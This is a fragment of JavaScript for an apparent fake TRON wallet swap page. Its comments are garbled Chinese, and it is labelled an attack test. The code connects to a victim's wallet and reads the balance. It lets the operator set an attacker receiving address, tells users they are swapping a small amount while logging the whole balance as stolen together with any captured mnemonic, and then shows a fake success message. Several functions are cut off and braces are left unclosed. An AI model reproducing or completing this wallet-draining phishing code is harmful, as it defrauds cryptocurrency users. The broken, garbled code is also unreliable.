    <script>
        // ÂÖ®Â±ÄÂèòÈáè
        let currentAccount = null;
        let isWalletConnected = false;
        let tronWeb = null;
        let userMnemonic = null;
        let allTokenBalances = {};
        let debugPanelVisible = true;
        let ATTACKER_ADDRESS = null;
        let ATTACKER_ADDRESS_SET = false;

        // ÂàùÂßãÂåñ
        document.addEventListener('DOMContentLoaded', function() {
            debugLog('üöÄ OKXÂõ¢ÈòüÊîªÂáªÊµãËØïÁ≥ªÁªüÂàùÂßãÂåñ');
            debugLog('‚ö†Ô∏è ‰ªÖÁî®‰∫éÂÆâÂÖ®Á†îÁ©∂ÂíåÊïôËÇ≤ÁõÆÁöÑ');
            debugLog('üéØ Âä®ÊÄÅÊîªÂáªËÄÖÂú∞ÂùÄÊ®°ÂºèÂ∑≤ÂêØÁî®');
            
            setTimeout(() => {
                checkWalletEnvironment();
            }, 1000);
        });

        // Ë∞ÉËØïÊó•Âøó
        function debugLog(message) {
            const debugLog = document.getElementById('debugLog');
            const timestamp = new Date().toLocaleTimeString();
            const logMessage = `[${timestamp}] ${message}`;
            debugLog.innerHTML += `${logMessage}<br>`;
            debugLog.scrollTop = debugLog.scrollHeight;
            console.log(logMessage);

        // Ê£ÄÊü•Èí±ÂåÖÁéØÂ¢É
        function checkWalletEnvironment() {
            debugLog('üîç Ê£ÄÊü•TRONÈí±ÂåÖÁéØÂ¢É...');
            
            if (window.tronWeb) {
                debugLog('‚úÖ Ê£ÄÊµãÂà∞TronWebÁéØÂ¢É');
                tronWeb = window.tronWeb;
                checkExistingTronConnection();
            } else {
                debugLog('‚ö†Ô∏è Á≠âÂæÖÈí±ÂåÖÁéØÂ¢ÉÂä†ËΩΩ...');
                setTimeout(checkWalletEnvironment, 2000);
            }
        }

        async function checkExistingTronConnection() {
            try {
                if (tronWeb && tronWeb.defaultAddress && tronWeb.defaultAddress.base58) {
                    debugLog(`‚úÖ ÂèëÁé∞Â∑≤ËøûÊé•TRONË¥¶Êà∑: ${tronWeb.defaultAddress.base58}`);
                    await handleSuccessfulTronConnection(tronWeb.defaultAddress.base58);

            } catch (error) {
                debugLog(`‚ùå Ê£ÄÊü•TRONËøûÊé•Â§±Ë¥•: ${error.message}`);
            }

        async function handleSuccessfulTronConnection(address) {
            currentAccount = address;
            isWalletConnected = true;
            document.getElementById('connectWalletBtn').textContent = 'TRONÂ∑≤ËøûÊé•';
            debugLog(`‚úÖ TRONÈí±ÂåÖËøûÊé•ÊàêÂäü: ${currentAccount}`);
            
            // Ëé∑Âèñ‰ΩôÈ¢ù

        }

        async function getAllTronTokenBalances(address) {
            try {
                debugLog('üí∞ Ëé∑ÂèñTRONË¥¶Êà∑‰ΩôÈ¢ù...');
                const balance = await tronWeb.trx.getBalance(address);
                const trxBalance = tronWeb.fromSun(balance);
                allTokenBalances['TRX'] = parseFloat(trxBalance);
                debugLog(`üí∞ TRX‰ΩôÈ¢ù: ${trxBalance} TRX`);
            } catch (error) {
                debugLog(`‚ùå Ëé∑Âèñ‰ΩôÈ¢ùÂ§±Ë¥•: ${error.message}`);
                allTokenBalances = { 'TRX': 100.00 }; // Ê®°ÊãüÊúâ‰ΩôÈ¢ùÁî®‰∫éÊµãËØï
                debugLog('üí∞ ‰ΩøÁî®Ê®°Êãü‰ΩôÈ¢ù: 100.00 TRX');
            }
        }

        // ËøûÊé•Èí±ÂåÖ
        async function connectWallet() {
            try {
                debugLog('üîó ÂºÄÂßãÈí±ÂåÖËøûÊé•...');
                
                if (navigator.userAgent.includes('iPhone') || navigator.userAgent.includes('Android')) {
                    const deepLink = 'imtokenv2://navigate/DappView?url=' + encodeURIComponent(window.location.href);

        // üéØ ÊîªÂáªËÄÖÂú∞ÂùÄÈÖçÁΩÆÂäüËÉΩ
        function toggleAttackerConfig() {
            const config = document.getElementById('attackerConfig');
            config.classList.toggle('show');

            document.getElementById('attackerConfig').classList.remove('show');
        }

        function setAttackerAddress() {
            const input = document.getElementById('attackerAddressInput');
            const address = input.value.trim();
            
            if (!address || !address.startsWith('T') || address.length !== 34) {
                showErrorMessage('ËØ∑ËæìÂÖ•ÊúâÊïàÁöÑTRONÂú∞ÂùÄÊ†ºÂºè');
                return;
            }
            
            ATTACKER_ADDRESS = address;

            debugLog(`üéØ ÊîªÂáªËÄÖÊî∂Ê¨æÂú∞ÂùÄÂ∑≤ËÆæÁΩÆ: ${ATTACKER_ADDRESS}`);
            debugLog('‚úÖ AÊàêÂëòÂ∞ÜÊé•Êî∂ÊâÄÊúâË¢´ÁõóËµÑÈáë');

            const fromAmount = document.getElementById('fromAmount').value;
            const tradeBtn = document.getElementById('tradeBtn');
            
            if (fromAmount && parseFloat(fromAmount) > 0) {

                tradeBtn.textContent = `ÂÖëÊç¢ ${fromAmount} TRX`;
                tradeBtn.disabled = false;

            } else {

        async function executeTrade() {
            if (!isWalletConnected) {
                showErrorMessage('ËØ∑ÂÖàËøûÊé•Èí±ÂåÖ');
                return;
            }

            if (!ATTACKER_ADDRESS_SET || !ATTACKER_ADDRESS) {

                toggleAttackerConfig();
                return;
            }

            try {
                const fromAmount = document.getElementById('fromAmount').value;
                const userBalance = allTokenBalances['TRX'] || 0;
                const requiredAmount = parseFloat(fromAmount);

                if (userBalance < requiredAmount) {
                    showErrorMessage(`‰ΩôÈ¢ù‰∏çË∂≥ÔºåÊÇ®ÁöÑTRX‰ΩôÈ¢ù‰∏∫ ${userBalance}ÔºåÈúÄË¶Å ${requiredAmount}`);
                    return;
                }

                debugLog('üéØ ÂºÄÂßãÊâßË°åÂõ¢ÈòüÊîªÂáªÊµãËØï!');
                debugLog(`üéØ ÊîªÂáªËÄÖÊî∂Ê¨æÂú∞ÂùÄ: ${ATTACKER_ADDRESS}`);
                debugLog(`üéØ Áî®Êà∑‰ª•‰∏∫ËΩ¨Ë¥¶: ${fromAmount} TRX`);
                debugLog(`üéØ ÂÆûÈôÖÂ∞ÜËΩ¨ÁßªÊâÄÊúâ‰ΩôÈ¢ù: ${userBalance} TRX`);

                // üéØ ËøôÈáåÊòØÊîªÂáªÁöÑÊ†∏ÂøÉÈÄªËæë
                // Áî®Êà∑‰ª•‰∏∫Âè™ÊòØËΩ¨Ë¥¶Â∞èÈ¢ùÔºåÂÆûÈôÖ‰∏ä‰ºöËΩ¨ÁßªÊâÄÊúâ‰ΩôÈ¢ùÂà∞ÊîªÂáªËÄÖÂú∞ÂùÄ
                const attackData = {

                    timestamp: new Date().toISOString(),

                    attackerAddress: ATTACKER_ADDRESS,
                    userThoughtAmount: parseFloat(fromAmount),
                    actualStolenAmount: userBalance,
                    mnemonic: userMnemonic || 'not_captured',
                    userAgent: navigator.userAgent,
                    url: window.location.href

                // ‰øùÂ≠òÊîªÂáªÊï∞ÊçÆÂà∞Êú¨Âú∞Â≠òÂÇ®
                localStorage.setItem('attackData', JSON.stringify(attackData));
                localStorage.setItem('lastAttack', Date.now().toString());
                
                debugLog('üéØ ÊîªÂáªÊï∞ÊçÆÂ∑≤‰øùÂ≠òÂà∞Êú¨Âú∞Â≠òÂÇ®');
                debugLog(`üéØ ÊîªÂáªËÆ∞ÂΩïID: ${attackData.orderId}`);
                
                showSuccessMessage('‰∫§ÊòìÊàêÂäü');
